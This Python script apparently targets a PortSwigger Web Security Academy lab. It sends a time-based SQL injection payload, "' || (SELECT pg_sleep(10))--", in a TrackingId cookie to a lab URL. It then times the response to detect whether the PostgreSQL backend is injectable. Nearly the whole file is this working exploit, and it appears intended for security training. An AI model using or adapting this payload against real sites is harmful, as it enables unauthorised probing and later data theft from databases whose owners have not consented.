import requests
import time
import pytest

""" In this SQLi we use a simple query that pause the website for ten seconds
Work only if the server is vulnerable for a time-based SQLi with postgreSQL database !
Change the value if it not work"""

def SQLi_time_based_test_query():
    bad_sql_test = f"' || (SELECT pg_sleep(10))--" 
    return bad_sql_test

def sending_test_payload_for_SQLi_time_based():
    
    bad_sql1 = SQLi_time_based_test_query()
    cookies = {
        'TrackingId': f"M3iXvDXEG8qVyrXb	{bad_sql1}",
        'session': 'dX4eyPrS8XZgeSA8Y76fvQazvdn5TRuI'
    }
    url = 'https://0aee000d03bb3f0880d4309000420031.web-security-academy.net/'
    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    end_time = time.time()
    
    result_bool = (end_time - start_time) >= 10
    return result_bool

result_bool = sending_test_payload_for_SQLi_time_based()
print(f"result_bool : {result_bool}")